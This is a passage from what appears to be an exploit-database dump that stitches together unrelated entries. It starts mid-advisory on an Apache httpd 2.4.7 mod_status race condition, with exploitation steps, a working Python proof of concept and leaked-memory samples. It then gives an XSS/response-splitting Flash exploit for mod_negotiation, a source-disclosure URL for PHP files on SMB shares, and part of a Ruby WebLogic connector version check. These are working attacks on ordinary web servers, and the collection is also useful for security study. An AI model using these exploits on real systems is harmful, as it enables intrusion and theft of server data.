NULL;\\r\ 118 res = apr_palloc(a, n);\\r\ 119 memcpy(res, m, n);\\r\ 120 return res;\\r\ \\r\ It allocates memory using apr_palloc function which returns\\r\ "ditry" memory (note that apr_pcalloc overwrite\\r\ allocated memory with NULs).\\r\ \\r\ So it\\\'s non-deterministic what\\\'s after the copied "G" byte.\\r\ There might be or might be not. For now let\\\'s\\r\ assume that the memory allocated by apr_palloc was dirty\\r\ (containing random bytes).\\r\ 7) ap_escape_logitem returns "G....." .junk. ""\\r\ \\r\ The value from the example above is then pushed to the ap_escape_html2\\r\ function which is also declared in util.c:\\r\ \\r\ 1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char\\r\ *s, int toasc)\\r\ 1861{\\r\ 1862 int i, j;\\r\ 1863 char *x;\\r\ 1864\\r\ 1865 /* first, count the number of extra characters */\\r\ 1866 for (i = 0, j = 0; s[i] != \\\'\\\'; i++)\\r\ 1867 if (s[i] == \\\'\\\')\\r\ 1868 j += 3;\\r\ 1869 else if (s[i] == \\\'&\\\')\\r\ 1870 j += 4;\\r\ 1871 else if (s[i] == \\\'"\\\')\\r\ 1872 j += 5;\\r\ 1873 else if (toasc && !apr_isascii(s[i]))\\r\ 1874 j += 5;\\r\ 1875\\r\ 1876 if (j == 0)\\r\ 1877 return apr_pstrmemdup(p, s, i);\\r\ 1878\\r\ 1879 x = apr_palloc(p, i + j + 1);\\r\ 1880 for (i = 0, j = 0; s[i] != \\\'\\\'; i++, j++)\\r\ 1881 if (s[i] == \\\'\\\') {\\r\ 1886 memcpy(&x[j], ">", 4);\\r\ 1887 j += 3;\\r\ 1888 }\\r\ 1889 else if (s[i] == \\\'&\\\') {\\r\ 1890 memcpy(&x[j], "&", 5);\\r\ 1891 j += 4;\\r\ 1892 }\\r\ 1893 else if (s[i] == \\\'"\\\') {\\r\ 1894 memcpy(&x[j], """, 6);\\r\ 1895 j += 5;\\r\ 1896 }\\r\ 1897 else if (toasc && !apr_isascii(s[i])) {\\r\ 1898 char *esc = apr_psprintf(p, "&#%3.3d;", (unsigned\\r\ char)s[i]);\\r\ 1899 memcpy(&x[j], esc, 6);\\r\ 1900 j += 5;\\r\ 1901 }\\r\ 1902 else\\r\ 1903 x[j] = s[i];\\r\ 1904\\r\ 1905 x[j] = \\\'\\\';\\r\ 1906 return x;\\r\ 1907}\\r\ \\r\ If the string from the example above would be passed to this function\\r\ we should get the following code-flow:\\r\ \\r\ 1) in the for-loop started in line 1866 we count the length of\\r\ escaped string\\r\ 2) because \\\'s\\\' string contains junk (due to only one byte being\\r\ allocated by the apr_palloc function),\\r\ it may contain \\\'>\\\' character. Let\\\'s assume that this is our\\r\ case\\r\ 3) after for-loop in 1866 line \\\'j\\\' is greater than 0 (at least one\\r\ s[i] equals \\\'>\\\' as assumed above\\r\ 4) in the 1879 line memory for escaped \\\'d\\\' string is allocated\\r\ 5) for-loop started in line 1880 copies string \\\'s\\\' to the escaped\\r\ \\\'d\\\' string BUT apr_palloc has allocated\\r\ only one byte for \\\'s\\\'. Thus, for each i > 0 the loop reads\\r\ random memory and copies that value\\r\ to \\\'d\\\' string. At this point it\\\'s possible to trigger an\\r\ information leak vulnerability (see section 5).\\r\ \\r\ However the \\\'s\\\' string may overlap with \\\'d\\\' i.e.:\\r\ \\r\ \\\'s\\\' is allocated under 0 with contents s = "AAAAAAAA>"\\r\ \\\'d\\\' is allocated under 8 then s[8] = d[0].\\r\ \\r\ If that would be the case, then for-loop would run forever (s[i] never\\r\ would be since it was overwritten in the loop\\r\ by non-zero). Forever... until it hits an unmapped memory or read only\\r\ area.\\r\ \\r\ Part of the scoreboard.c code which may overwrite the\\r\ ws_record->request was discovered using a tsan:\\r\ \\r\ #1 ap_escape_logitem ??:0 (exe+0x0000000411f2)\\r\ #2 status_handler\\r\ /home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839\\r\ (mod_status.so+0x0000000044b0)\\r\ #3 ap_run_handler ??:0 (exe+0x000000084d98)\\r\ #4 ap_invoke_handler ??:0 (exe+0x00000008606e)\\r\ #5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)\\r\ #6 ap_process_http_async_connection http_core.c:0\\r\ (exe+0x0000000b143e)\\r\ #7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\\r\ #8 ap_run_process_connection ??:0 (exe+0x00000009d156)\\r\ #9 process_socket event.c:0 (exe+0x0000000cc65e)\\r\ #10 worker_thread event.c:0 (exe+0x0000000d0945)\\r\ #11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\\r\ #12 :0 (libtsan.so.0+0x00000001b279)\\r\ \\r\ Previous write of size 1 at 0x7feff2b862b8 by thread T2:\\r\ #0 update_child_status_internal scoreboard.c:0\\r\ (exe+0x00000004d4c6)\\r\ #1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)\\r\ #2 ap_process_http_async_connection http_core.c:0\\r\ (exe+0x0000000b139a)\\r\ #3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\\r\ #4 ap_run_process_connection ??:0 (exe+0x00000009d156)\\r\ #5 process_socket event.c:0 (exe+0x0000000cc65e)\\r\ #6 worker_thread event.c:0 (exe+0x0000000d0945)\\r\ #7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\\r\ #8 :0 (libtsan.so.0+0x00000001b279)\\r\ --[ 3. Consequences\\r\ \\r\ Race condition described in section 2, may lead to:\\r\ \\r\ - information leak in case when the string returned by\\r\ ap_escape_logitem is not at the end,\\r\ junk after copied bytes may be valuable\\r\ - overwriting heap with a user supplied value which may imply code\\r\ execution\\r\ --[ 4. Exploitation\\r\ \\r\ In order to exploit the heap overflow bug it\\\'s necessary to get\\r\ control over:\\r\ \\r\ 1) triggering the race-condition bug\\r\ 2) allocating \\\'s\\\' and \\\'d\\\' strings in the ap_escape_html2 to overlap\\r\ 3) part of \\\'s\\\' which doesn\\\'t overlap with \\\'d\\\' (this string is copied\\r\ over and over again)\\r\ 4) overwriting the heap in order to get total control over the cpu or\\r\ at least modify the\\r\ apache\\\'s handler code flow for our benefits\\r\ --[ 5. Information Disclosure Proof of Concept\\r\ \\r\ -- cut\\r\ #! /usr/bin/env python\\r\ \\r\ import httplib\\r\ import sys\\r\ import threading\\r\ import subprocess\\r\ import random\\r\ \\r\ def send_request(method, url):\\r\ try:\\r\ c = httplib.HTTPConnection(\\\'127.0.0.1\\\', 80)\\r\ c.request(method,url);\\r\ if "foo" in url:\\r\ print c.getresponse().read()\\r\ c.close()\\r\ except Exception, e:\\r\ print e\\r\ pass\\r\ \\r\ def mod_status_thread():\\r\ while True:\\r\ send_request("GET", "/foo?notables")\\r\ \\r\ def requests():\\r\ evil = \\\'\\\'.join(\\\'A\\\' for i in range(random.randint(0, 1024)))\\r\ while True:\\r\ send_request(evil, evil)\\r\ \\r\ threading.Thread(target=mod_status_thread).start()\\r\ threading.Thread(target=requests).start()\\r\ \\r\ -- cut\\r\ \\r\ Below are the information leak samples gathered by running the poc\\r\ against the\\r\ testing Apache instance. Leaks include i.e. HTTP headers, htaccess\\r\ content,\\r\ httpd.conf content etc. On a live systems with a higher traffic\\r\ samples should\\r\ be way more interesting.\\r\ \\r\ $ ./poc.py | grep "" |grep -v AAAA | grep -v "{}"| grep -v notables\\r\ 127.0.0.1 {A} []\\r\ 127.0.0.1 {A.01 cu0 cs0\\r\ 127.0.0.1 {A27.0.0.1} []\\r\ 127.0.0.1 {A|0|10 [Dead] u.01 s.01 cu0 cs0\\r\ 127.0.0.1 {A\\r\ \\xc3\\x9b []\\r\ 127.0.0.1 {A HTTP/1.1} []\\r\ 127.0.0.1 {Ab>
\\r\ 127.0.0.1 {AAA} [127.0.1.1:19666]\\r\ 127.0.0.1 {A0.1.1:19666]
\\r\ 127.0.0.1 {A\\xc2\\xa7} []\\r\ 127.0.0.1 {A cs0\\r\ 127.0.0.1 {Adentity\\r\ 127.0.0.1 {A HTTP/1.1} []\\r\ 127.0.0.1 {Ape: text/html; charset=ISO-8859-1\\r\ 127.0.0.1 {Ahome/IjonTichy/httpd-2.4.7-vanilla/htdocs/} []\\r\ 127.0.0.1 {A\\xc3\\xbf\\xc3\\xbf\\xc3\\xbf\\xc3\\xbf\\xc3\\xbf\\xc3\\xbf\\xc3\\xbf} []\\r\ 127.0.0.1 {Aanilla/htdocs/foo} []\\r\ 127.0.0.1 {A0n/httpd-2.4.7-vanilla/htdocs/foo/} []\\r\ 127.0.0.1 {A......................................... } []\\r\ 127.0.0.1 {A-2014 16:23:30 CEST} []\\r\ 127.0.0.1 {Acontent of htaccess\\r\ 127.0.0.1 {Aver: Apache/2.4.7 (Unix)\\r\ 127.0.0.1 {Aroxy:balancer://mycluster} []\\r\ We hope you enjoyed it.\\r\ \\r\ Regards,\\r\ Marek Kroemeke, AKAT-1 and 22733db72ab3ed94b5f8a1ffcde850251fe6f466\

31052.exploit title: Apache 2.2.6 mod_negotiation - HTML Injection / HTTP Response Splitting
31052.content:
"source: https://www.securityfocus.com/bid/27409/info\\r\
\\r\
Apache \'mod_negotiation\' is prone to an HTML-injection and an HTTP response-splitting vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.\\r\
\\r\
Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, and influence or misrepresent how web content is served, cached, or interpreted; other attacks are also possible. \\r\
\\r\
// Tested on IE 7 and FF 2.0.11, Flash plugin 9.0 r115\\r\
// Compile with flex compiler\\r\
package\\r\
{\\r\
  import flash.display.Sprite;\\r\
  import flash.net.*\\r\
  public class TestXss extends flash.display.Sprite {\\r\
    public function TestXss(){\\r\
      var r:URLRequest = new URLRequest(\'http://victim/<img%20src=sa%20\\r\
                  onerror=eval(document.location.hash.substr(1))>#alert(123)\');\\r\
\\r\
      r.method = \'POST\';\\r\
      r.data = unescape(\'test\');\\r\
      r.requestHeaders.push(new URLRequestHeader(\'Accept\', \'image/jpeg; q=0\'));\\r\
\\r\
      navigateToURL(r, \'_self\');\\r\
     \\r\
    }\\r\
    }\\r\
}"

30901.exploit title: Apache 2.2.6 (Windows) - Share PHP File Extension Mapping Information Disclosure
30901.content:
"source: https://www.securityfocus.com/bid/26939/info\\r\
\\r\
Apache is prone to an information-disclosure vulnerability.\\r\
\\r\
This issue occurs because Apache fails to properly associate file extensions with the correct engines when handling specially crafted requests for files on Windows SMB shares.\\r\
\\r\
Attackers can leverage this issue to view arbitrary script files as plain text. Potentially sensitive information may be present in the script code. Information harvested could aid in further attacks.\\r\
\\r\
This issue affects Apache 2.2.6 when serving PHP files from a Windows SMB share; other versions may also be affected.\\r\
\\r\
NOTE: This issue may also occur when handling other filename extensions that use AddType directives to associate scripts or executables (e.g. \'.cgi\\\\\', \'.py\\\\\', \'.rb\\\\\', etc.).\\r\
\\r\
http://www.example.com/winshare/info.php\\\\ "

\\r\
\ \ if res and res.code == 200 and res.body =~ /Weblogic Bridge Message/\\r\
\ \ \ # BEA WebLogic 8.1 SP6 - mod_wl_20.so\\r\
\ \ \ case res.body\\r\
\ \ \ when (/Build date\\\\/time:<\\\\/B> <I>Jun 16 2006 15:14:11/ and /Change Number:<\\\\/B> <I>779586/)\\r\
\ \ \ \ return "Version found: BEA WebLogic 8.1 SP6 - mod_wl_20.so"\\r\
\ \ \ # BEA WebLogic 8.1 SP5 - mod_wl_20.so\\r\
\ \ \ when (/Build date\\\\/time:<\\\\/B> <I>Aug  5 2005 11:19:57/ and /Change Number:<\\\\/B> <I>616810/)\\r\
\ \ \ \ return "Version found: BEA WebLogic 8.1 SP5 - mod_wl_20.so"\\r\
\ \ \ when (/Build date\\\\/time:<\\\\/B> <I>Oct 25 2004 09:25:23/ and /Change Number:<\\\\/B> <I>452998/)\\r\
\ \ \ \ return "Version found: BEA WebLogic 8.1 SP4 - mod_wl_20.so"\\r\
\ \ \ # Check for dates prior to patch release\\r\
\ \ \ when /([A-Za-z]{3} [\\\\s\\\\d]{2} [\\\\d]{4})/\\r\
\ \ \ \ build_date = Date.parse($1)\\r\
\ \ \ \ if build_date <= Date.parse("Jul 28 2008")\\r\
\ \ \ \ \ return "BEA WebLogic connector vulnerable"\\r\
\ \ \ \ else\\r\
\ \ \ \ \ return "BEA WebLogic connector no vulnerable"\\r\
\ \ \ \ end\\r\
\ \ \ else\\r\
\ \ \ \ return "BEA WebLogic connector undefined"\\r\
\ \ \ end\\r\
\ \ end\\r\
\\r\
\ \ return "BEA WebLogic connector not found"\\r\
\\r\
\ end\\r\
\\r\
end\
